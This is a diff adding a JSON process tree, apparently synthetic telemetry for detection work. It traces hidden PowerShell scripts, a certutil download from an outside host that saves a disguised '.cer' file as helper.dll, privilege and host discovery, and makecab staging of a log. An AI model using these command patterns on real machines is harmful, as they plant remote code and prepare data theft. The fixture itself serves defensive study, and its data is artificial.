@@ -1,0 +1,125 @@
+{
+  "pid": 196290,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k WdiServiceHost",
+  "children": [
+    {
+      "pid": 196294,
+      "ppid": 196290,
+      "name": "powershell.exe",
+      "command": "powershell.exe -NoProfile -WindowStyle Hidden -File \"C:\\Users\\Public\\TrustRefresh_143c972c.ps1\" -Host \"OPS-896\" -Mode Verify",
+      "children": [
+        {
+          "pid": 196301,
+          "ppid": 196294,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 16\"",
+          "children": [
+            {
+              "pid": 196302,
+              "ppid": 196301,
+              "name": "certutil.exe",
+              "command": "certutil.exe -urlcache -split -f \"http://support.wingtipsoft.com/certs/workstation.cer\" \"C:\\Users\\Public\\helper.dll\"",
+              "children": [
+                {
+                  "pid": 196306,
+                  "ppid": 196302,
+                  "name": "timeout.exe",
+                  "command": "timeout.exe /t 12 /nobreak",
+                  "children": [
+                    {
+                      "pid": 196311,
+                      "ppid": 196306,
+                      "name": "hostname.exe",
+                      "command": "hostname.exe > \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\host_5cca12ea.txt\"",
+                      "children": [
+                        {
+                          "pid": 196312,
+                          "ppid": 196311,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\host_bc45bc8c.txt\"",
+                          "children": [
+                            {
+                              "pid": 196325,
+                              "ppid": 196312,
+                              "name": "powershell.exe",
+                              "command": "powershell.exe -WindowStyle Minimized -File \"C:\\ProgramData\\Litware\\Build\\CollectInventory_c4bb2056.ps1\" -Host \"OPS-487\" -Mode Delta",
+                              "children": [
+                                {
+                                  "pid": 196326,
+                                  "ppid": 196325,
+                                  "name": "timeout.exe",
+                                  "command": "timeout.exe /t 17 /nobreak",
+                                  "children": [
+                                    {
+                                      "pid": 196328,
+                                      "ppid": 196326,
+                                      "name": "findstr.exe",
+                                      "command": "findstr.exe /i \"task\" \"C:\\ProgramData\\Fabrikam\\Logs\\diag.log\"",
+                                      "children": [
+                                        {
+                                          "pid": 196329,
+                                          "ppid": 196328,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /priv > \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\who_fac6b9b1.txt\"",
+                                          "children": [
+                                            {
+                                              "pid": 196332,
+                                              "ppid": 196329,
+                                              "name": "cmd.exe",
+                                              "command": "cmd.exe /c \"hostname.exe > \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\host_2c42a506.txt\"\"",
+                                              "children": []
+                                            }
+                                          ]
+                                        },
+                                        {
+                                          "pid": 196335,
+                                          "ppid": 196328,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /priv",
+                                          "children": [
+                                            {
+                                              "pid": 196338,
+                                              "ppid": 196335,
+                                              "name": "makecab.exe",
+                                              "command": "makecab.exe \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\support.log\" \"C:\\Users\\kiran.sharma\\AppData\\Local\\Temp\\support.cab\"",
+                                              "children": []
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 196316,
+      "ppid": 196290,
+      "name": "hostname.exe",
+      "command": "hostname.exe",
+      "children": [
+        {
+          "pid": 196320,
+          "ppid": 196316,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 13 /nobreak",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
